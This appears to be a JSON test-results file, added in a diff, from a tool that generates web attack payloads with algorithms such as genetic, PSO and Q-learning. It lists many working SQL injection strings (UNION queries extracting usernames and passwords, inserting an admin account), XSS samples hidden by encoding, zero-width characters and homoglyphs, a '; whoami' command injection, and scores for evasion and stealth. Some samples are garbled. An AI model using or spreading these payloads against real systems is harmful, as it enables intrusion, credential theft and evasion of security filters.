@@ -1,0 +1,375 @@
+{
+  "timestamp": "2025-10-27T20:36:10.556951",
+  "tests": {
+    "Basic Functionality": {
+      "success": true,
+      "execution_time": 0.027622699737548828,
+      "results": true
+    },
+    "Individual Algorithms": {
+      "success": true,
+      "execution_time": 0.12104153633117676,
+      "results": {
+        "Deep Neural Network": {
+          "success": true,
+          "payload_count": 5,
+          "execution_time": 0.0005578994750976562,
+          "sample_payloads": [
+            "/*'; WAITFOR DELAY '00:00:05'--*/",
+            "'/**/OR/**/(SELECT/**/COUNT(*)/**/FROM/**/sysobjects)>0--",
+            "';/**/CREATE/**/TABLE/**/temp/**/(data/**/VARCHAR(8000));/**/INSERT/**/INTO/**/temp/**/SELECT/**/@@version--"
+          ]
+        },
+        "Advanced Genetic": {
+          "success": true,
+          "payload_count": 6,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "' OR  =11--",
+            "' H?  =g --",
+            "' HR 1=1 --"
+          ]
+        },
+        "Deep Q-Learning": {
+          "success": true,
+          "payload_count": 31,
+          "execution_time": 0.004363298416137695,
+          "sample_payloads": [
+            "JyBPUiAxPTEgLS0=",
+            "%2527%2520AND%2520%2528SELECT%2520SUBSTRING%2528%2540%2540version%252C1%252C1%2529%2529%253D%2527M%2527--",
+            "JTI1MjUwMCUyNTI3JTI1MjB1TmlPbiUyNTIwc0VsRWNUJTI1MjBOYU1lJTI1MkNwQXNTd09yRCUyNTIwRnJPbSUyNTIwdVNlUnMtLQ=="
+          ]
+        },
+        "Enhanced PSO": {
+          "success": true,
+          "payload_count": 40,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "%00'; CREATE TABLE temp (data VARCHAR(8000)); INSERT INTO temp SELECT @@version--",
+            "&#x27; AND (SELECT TOP 1 name FROM sysobjects WHERE xtype=&#x27;U&#x27;)=&#x27;users&#x27;--",
+            "JyBBTkQgMT1DT05WRVJUKGludCwgJ3Rlc3QnKS0t"
+          ]
+        },
+        "Adversarial Training": {
+          "success": true,
+          "payload_count": 5,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "' OR 1=1 --\u0000\u0000",
+            "'' OR 1=1 --\u0000",
+            "'%20OR%201%3D1%20--%00"
+          ]
+        },
+        "Transformer-Based": {
+          "success": false,
+          "error": "module 'numpy.random' has no attribute 'softmax'",
+          "payload_count": 0,
+          "execution_time": 0
+        },
+        "LSTM Sequential": {
+          "success": false,
+          "error": "module 'numpy.random' has no attribute 'softmax'",
+          "payload_count": 0,
+          "execution_time": 0
+        },
+        "Simulated Annealing": {
+          "success": true,
+          "payload_count": 30,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "&#x27;%c%%af**%c0%aOR%c0%af**%c0%af1=1%c0%af**--&$&RHx21;%c0Saf**A%c0%afOR%c0%af**%c>0%af7=1%co%afD\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c0%a1=1%cm3af**--&&#Hx21;c0N%f**A%c0aaOR%c00Aaf**%c0%af7=1%c0%af*\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c%af1=1%c0%af0*--&&#Hx21;%c0%af**A%c0%afOR%c0%%f**%c0%af7=1%c0%af*\r&%c0%af--&&#x27;%c00af**%c0%afOR%c0%af**%c0%af1=1Vc0%af**--&&#Hx21;%c0%af**A%c*%afOR%c0%af**%c0%af7=1%c0L%af*\r-%c%af--",
+            "&#x27;%c%%af**%c0%aOR%c0%af**%c0%af1=1%c0%af**--&$&RHx21;%c0Saf**A%c0%afOR%c0%af**%c>0%af7=1%co%afD\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c0%a1=1%cm3af**--&8#Hx21;c0N%f**A%c0aaOR%c00Aaf**%c0%af7=1%c0%af*\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c%af1=1%c0%af0*--&&#Hx211;%c0%af**A%c0%afOR%c0%%f**%c0%af7=1%c0%af*\r&%c0%af--&&#x27;%c00af**%c0%afOR%c0%af**%c0%a1=1Vc0%af**--&&#Hx21;%c0%af**A%c*%afOR%c0%af**%c0%af7=1%c0L%af*\r-%c%af--",
+            "&#x27;%c0%af**%c0%aOR%c0%af**%c0%af1=1%c0%af**--&$&RHx21;%c0Saf**A%c0%afOR%c0%af**%c>0%af7=1%c0%af*\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c0%a1=1%c03af**--&&#Hx21;%c0%f**A%c0%afOR%c00af**%c0%af7=1%c0%af*\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c%af1=1%c0%af0*--&&#Hx21;%c0%af**A%c0%afOR%c0%af**%c0%af7=1%c0%af*\r&%c0%af--&&#x27;%c0%af**%c0%afOR%c0%af**%c0%af1=1Vc0%af**--&&#Hx21;%c0%af**A%c*%afOR%c0%af**%c0%af7=1%c0%af*\r&%c%%af--"
+          ]
+        },
+        "Ant Colony": {
+          "success": true,
+          "payload_count": 35,
+          "execution_time": 0.10518240928649902,
+          "sample_payloads": [
+            "admin'--yx-fkz3'C)vbxvlUpRmn7'vTJ4jp<>oG<B4/XfW",
+            "admin'--<x6IXHZSVz'X2Lf3I4iP",
+            "admin'--K=X'TC=h>LTlI0ta'Ze3K>\"4xTz=G9N)tIDW"
+          ]
+        },
+        "Bayesian Optimization": {
+          "success": true,
+          "payload_count": 16,
+          "execution_time": 0.0038938522338867188,
+          "sample_payloads": [
+            "' Or (SeLeCt cOuNt(*) FrOm sYjSoBjEcTs)-0->",
+            "' OR (SELECT COUNT(*) FROM syJsobjects)>0--",
+            "' OR (SELECT COUNT(*) FROM sysobjects)>0--"
+          ]
+        },
+        "Metamorphic": {
+          "success": true,
+          "payload_count": 25,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "OR/* comment */ ' /* comment */1=1 --",
+            "-- ' 1=1 OR/**/",
+            "2>1 ' -- OR"
+          ]
+        },
+        "Steganographic": {
+          "success": true,
+          "payload_count": 7,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "'\u2001OR\u20011=1\u2001--",
+            "' O\ufeffR 1\ufeff=\ufeff1 --\ufeff",
+            "'\u2003OR\u20031=1\u2003--"
+          ]
+        },
+        "ML-Resistant": {
+          "success": true,
+          "payload_count": 8,
+          "execution_time": 0.0,
+          "sample_payloads": [
+            "' OR l=1 --",
+            "&#x27; OR 1=1 --",
+            "JyBPUiAxPTEgLS0="
+          ]
+        },
+        "Adaptive Learning": {
+          "success": true,
+          "payload_count": 45,
+          "execution_time": 0.002245187759399414,
+          "sample_payloads": [
+            "' OR (SELECT COUNT(*) FROM sysobjects)>0--",
+            "' AND (SELECT SUBNTRISG(@@version,1,1))='M'--",
+            " ' AND (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')='users'--"
+          ]
+        }
+      }
+    },
+    "Advanced Features": {
+      "success": true,
+      "execution_time": 0.004119157791137695,
+      "results": {
+        "encoding": {
+          "url_encode": {
+            "success": true,
+            "original_length": 30,
+            "encoded_length": 48,
+            "encoded_payload": "%3Cscript%3Ealert%28%27test%27%29%3C%2Fscript%3E"
+          },
+          "double_url_encode": {
+            "success": true,
+            "original_length": 30,
+            "encoded_length": 66,
+            "encoded_payload": "%253Cscript%253Ealert%2528%2527test%2527%2529%253C..."
+          },
+          "html_encode": {
+            "success": true,
+            "original_length": 30,
+            "encoded_length": 52,
+            "encoded_payload": "&lt;script&gt;alert(&#x27;test&#x27;)&lt;/script&g..."
+          },
+          "base64_encode": {
+            "success": true,
+            "original_length": 30,
+            "encoded_length": 40,
+            "encoded_payload": "PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+"
+          },
+          "hex_encode": {
+            "success": true,
+            "original_length": 30,
+            "encoded_length": 90,
+            "encoded_payload": "%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%27%74%6..."
+          }
+        },
+        "steganography": {
+          "whitespace": {
+            "success": true,
+            "payload_count": 4,
+            "sample": "<script>alert('test')</script>"
+          },
+          "invisible_chars": {
+            "success": true,
+            "payload_count": 8,
+            "sample": "<s\ufeffcri\ufeffpt\ufeff>al\ufeffe\ufeffr\ufefft('tes\ufefft\ufeff')</\ufeffs\ufeffcr\ufeffip\ufefft>"
+          },
+          "homoglyphs": {
+            "success": true,
+            "payload_count": 5,
+            "sample": "<s\u200cc\u200cr\u200ci\u200cpt>\u200cale\u200cr\u200ct\u200c(\u200c't\u200cest\u200c'\u200c)</\u200csc\u200cr\u200cip\u200ct>"
+          }
+        },
+        "metamorphic": {
+          "instruction_reordering": {
+            "success": true,
+            "original": "<script>alert('test')</script>",
+            "transformed": "<script>alert('test')</script>",
+            "length_change": 0
+          },
+          "equivalent_instruction_substitution": {
+            "success": true,
+            "original": "<script>alert('test')</script>",
+            "transformed": "<script>alert('test')</script>",
+            "length_change": 0
+          },
+          "dead_code_insertion": {
+            "success": true,
+            "original": "<script>alert('test')</script>",
+            "transformed": "<script>alert('test')/* comment */</script>",
+            "length_change": 13
+          }
+        },
+        "ml_resistance": {
+          "gradient_based": {
+            "success": true,
+            "payload_count": 9,
+            "sample": "\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0061\\u006c..."
+          },
+          "feature_space_attack": {
+            "success": true,
+            "payload_count": 7,
+            "sample": "<scri\u0440t>al\u0435rt('t\u0435st')</scri\u0440t>"
+          },
+          "transferability_attack": {
+            "success": true,
+            "payload_count": 9,
+            "sample": "%253Cscript%253E\u0430l\u0435rt%2528%2527t\u0435st%2527%2529%253C%252Fscrip..."
+          }
+        },
+        "fitness": {
+          "payload_0": {
+            "payload": "' OR 1=1 --",
+            "fitness": 0.2500048283797458,
+            "multi_objectives": {
+              "evasion": 1.0,
+              "functionality": 0.0,
+              "stealth": 1.0,
+              "effectiveness": 0.24602088333617614,
+              "total": 0.5492041766672352
+            },
+            "success": true
+          },
+          "payload_1": {
+            "payload": "<script>alert(1)</script>",
+            "fitness": 0.6262103996530586,
+            "multi_objectives": {
+              "evasion": 0.6956826935011902,
+              "functionality": 0.3,
+              "stealth": 0.8,
+              "effectiveness": 0.5313217124686298,
+              "total": 0.564969150544083
+            },
+            "success": true
+          },
+          "payload_2": {
+            "payload": "; whoami",
+            "fitness": 0.39935955624065833,
+            "multi_objectives": {
+              "evasion": 0.9127875525925115,
+              "functionality": 0.3,
+              "stealth": 0.8,
+              "effectiveness": 0.3414031192121137,
+              "total": 0.5921168896201762
+            },
+            "success": true
+          },
+          "payload_3": {
+            "payload": "test",
+            "fitness": 0.15700728061551047,
+            "multi_objectives": {
+              "evasion": 1.0,
+              "functionality": 0.0,
+              "stealth": 1.0,
+              "effectiveness": 0.10437465448370806,
+              "total": 0.5208749308967416
+            },
+            "success": true
+          },
+          "payload_4": {
+            "payload": "",
+            "fitness": 0.0,
+            "multi_objectives": {
+              "evasion": 0.925833190352805,
+              "functionality": 0.0,
+              "stealth": 1.0,
+              "effectiveness": 0.0,
+              "total": 0.4777499571058415
+            },
+            "success": true
+          }
+        }
+      }
+    },
+    "Performance Benchmarks": {
+      "success": true,
+      "execution_time": 0.06415414810180664,
+      "results": {
+        "Small Scale": {
+          "success": true,
+          "execution_time": 0.007105350494384766,
+          "memory_usage": 0,
+          "payload_count": 10,
+          "payloads_per_second": 1407.3901080464398
+        },
+        "Medium Scale": {
+          "success": true,
+          "execution_time": 0.0051419734954833984,
+          "memory_usage": 0,
+          "payload_count": 13,
+          "payloads_per_second": 2528.2121760096443
+        },
+        "Large Scale": {
+          "success": true,
+          "execution_time": 0.05190682411193848,
+          "memory_usage": 0,
+          "payload_count": 50,
+          "payloads_per_second": 963.2644812206896
+        }
+      }
+    },
+    "Adaptive Learning": {
+      "success": true,
+      "execution_time": 0.004244327545166016,
+      "results": {
+        "pattern_extraction": {
+          "response_0": {
+            "response": "MySQL Error: You have an error in your SQL syntax ...",
+            "patterns": [
+              "mysql.*error",
+              "length_0"
+            ],
+            "is_success": false,
+            "success": true
+          },
+          "response_1": {
+            "response": "root:x:0:0:root:/root:/bin/bash...",
+            "patterns": [
+              "success_root:.*:",
+              "length_0"
+            ],
+            "is_success": true,
+            "success": true
+          },
+          "response_2": {
+            "response": "Welcome admin! You are now logged in....",
+            "patterns": [
+              "success_welcome.*admin",
+              "success_logged.*in",
+              "length_0"
+            ],
+            "is_success": false,
+            "success": true
+          }
+        },
+        "adaptive_generation": {
+          "success": true,
+          "payload_count": 47,
+          "sample_payloads": [
+            "%00'; CREATE TABLE temp (data VARCHAR(8000)); INSERT INTO temp SELECT @@version--",
+            "' UNION SELECT name,password FROM users--&' UNION SELECT name,password FROM users--",
+            "' OR 1=1; INSERT INTO \u0430dmin VALUES('h\u0430cker','\u0440\u0430ssw\u043erd')--"
+          ],
+          "learning_weights_count": 4
+        }
+      }
+    }
+  }
+}
